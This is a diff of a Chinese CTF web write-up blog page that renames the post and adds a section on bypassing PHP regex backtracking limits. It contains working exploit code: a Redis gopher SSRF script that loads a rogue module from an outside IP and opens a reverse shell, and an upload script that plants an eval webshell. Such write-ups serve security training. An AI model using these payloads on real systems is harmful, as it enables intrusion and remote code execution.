@@ -17,12 +17,12 @@
                 <meta name="author" content="whistle.H">
                 <meta name="keywords" content="">
                 
-                    <meta name="description" content="0、写在前面 记录一下在NSS平台做到一些题目">
+                    <meta name="description" content="0、写在前面 记录一下在各种平台做到一些题目">
 <meta property="og:type" content="article">
-<meta property="og:title" content="NSS-Web-wp">
+<meta property="og:title" content="CTF-Web-wp">
 <meta property="og:url" content="http://example.com/2022/04/13/blog0013-NSS-Web-wp/index.html">
 <meta property="og:site_name" content="The world of whistleH">
-<meta property="og:description" content="0、写在前面 记录一下在NSS平台做到一些题目">
+<meta property="og:description" content="0、写在前面 记录一下在各种平台做到一些题目">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220816223126427.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220819203318445.png">
@@ -56,7 +56,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20220923161825562.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0013/image-20230401144412655.png">
 <meta property="article:published_time" content="2022-04-13T02:58:50.000Z">
-<meta property="article:modified_time" content="2023-07-18T07:05:08.399Z">
+<meta property="article:modified_time" content="2023-08-22T10:13:41.350Z">
 <meta property="article:author" content="whistle.H">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="web">
@@ -68,7 +68,7 @@
                                 
                                         
                                                     <title>
-                                                        NSS-Web-wp - The world of whistleH
+                                                        CTF-Web-wp - The world of whistleH
                                                     </title>
 
                                                     <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
@@ -238,7 +238,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="NSS-Web-wp"></span>
+            <span id="subtitle" data-typed-text="CTF-Web-wp"></span>
           
         </div>
 
@@ -261,7 +261,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          41k 字
+          42k 字
         
       </span>
     
@@ -272,7 +272,7 @@
         
         
         
-          340 分钟
+          349 分钟
         
       </span>
     
@@ -309,13 +309,13 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">NSS-Web-wp</h1>
+            <h1 id="seo-header">CTF-Web-wp</h1>
             
             
               <div class="markdown-body">
                 
                 <h2 id="写在前面">0、写在前面</h2>
-<p>记录一下在NSS平台做到一些题目</p>
+<p>记录一下在各种平台做到一些题目</p>
 <span id="more"></span>
 <h2 id="lfi">1、LFI</h2>
 <h3 id="第五空间-cleanup条件竞争">1、2021第五空间-CleanUp（条件竞争）</h3>
@@ -623,6 +623,14 @@
 <p>搭建成功之后，我们构造攻击脚本，此时的数据需要按照redis协议进行相关的编码，可以模仿上面的GitHub repo</p>
 <p>需要注意的是，我们将对应的参数构造之后去攻击时，需要对gopher协议再次完成url编码。（url参数上传时会解析一次，libcurl会再次解析）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    CRLF = <span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd = <span class="hljs-string">&quot;&quot;</span><br>    cmd += <span class="hljs-string">&quot;*&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd += CRLF + <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x))) + CRLF + x<br>    cmd += CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">generate_rce</span>(<span class="hljs-params">lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /etc/passwd&quot;</span></span>):</span><br>    exp_filename = <span class="hljs-string">&quot;exp.so&quot;</span><br>    cmd = [<br>    	<span class="hljs-comment"># 第一次</span><br>        <span class="hljs-string">&quot;CONFIG SET dir /tmp/&quot;</span>,<br>        <span class="hljs-string">&quot;config set dbfilename exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF &#123;&#125; &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(lhost, lport),<br><br>		<span class="hljs-comment"># 第二次</span><br>        <span class="hljs-string">&quot;MODULE LOAD /tmp/exp.so&quot;</span>,<br>		<br>		<span class="hljs-comment"># 第三次	</span><br>        <span class="hljs-string">&quot;system.exec &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(command.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>		<span class="hljs-comment"># 这里有个细节就是使用$&#123;IFS&#125;代替参数中的空格，因为上面的redis_format函数会根据空格来进行分割命令和参数</span><br><br>        <span class="hljs-string">&quot;system.rev 43.143.123.40$&#123;IFS&#125;7788&quot;</span>,<br>        <span class="hljs-string">&quot;SLAVEOF NO ONE&quot;</span>,<br>        <span class="hljs-string">&quot;CONFIG SET dbfilename dump.rdb&quot;</span>,<br>        <span class="hljs-string">&quot;system.exec rm$&#123;IFS&#125;/tmp/exp.so&quot;</span>,<br>        <span class="hljs-string">&quot;MODULE UNLOAD system&quot;</span>,<br>        <span class="hljs-string">&quot;quit&quot;</span>,<br><br>    ]<br>    <span class="hljs-keyword">if</span> passwd:<br>        cmd.insert(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    lhost = <span class="hljs-string">&quot;43.143.123.40&quot;</span><br>    lport = <span class="hljs-string">&quot;7788&quot;</span><br><br>    rhost = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    rport = <span class="hljs-string">&quot;6379&quot;</span><br><br>    passwd = <span class="hljs-string">&quot;root&quot;</span><br><br>    payload = <span class="hljs-string">&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span>  + rport +  <span class="hljs-string">&quot;/_&quot;</span><br><br>    cmd = generate_rce(lhost, lport, passwd, command=<span class="hljs-string">&quot;cat /flag&quot;</span>)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cmd:<br>        a = redis_format(i)<br>        payload += quote(a)<br>    <br>    <span class="hljs-built_in">print</span>(payload)<br></code></pre></td></tr></table></figure>
+<h2 id="正则相关">12、正则相关</h2>
+<h3 id="正则最大回溯绕过">1、正则最大回溯绕过</h3>
+<p>简单来说，对于php代码，正则库是依据NAF实现的，因此需要引入回溯机制。</p>
+<p>php中设置了最大回溯次数，默认为10万次。</p>
+<p>当正则表达式开启了贪心，我们就可以利用正则最大回溯次数的限制从而完成绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;./data/&#x27;</span>;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125; <br></code></pre></td></tr></table></figure>
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>files = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&#x27;1.zip&#x27;</span>, <span class="hljs-string">b&quot;&lt;?php file_put_contents(&#x27;hacker.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;); ?&gt;&quot;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">1000000</span>)<br>&#125;<br><br>url = <span class="hljs-string">&quot;http://5c447b18-7633-4d09-9eb7-d6caffed7c69.challenge.ctf.show/&quot;</span><br><br>r = requests.post(<br>    url=url,<br>    files=files,<br>    proxies=&#123;<br>        <span class="hljs-string">&quot;http&quot;</span>:<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span><br>    &#125;<br>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
 
                 
               </div>
@@ -688,7 +696,7 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>NSS-Web-wp</div>
+      <div>CTF-Web-wp</div>
       <div>http://example.com/2022/04/13/blog0013-NSS-Web-wp/</div>
     </div>
     <div class="license-meta">
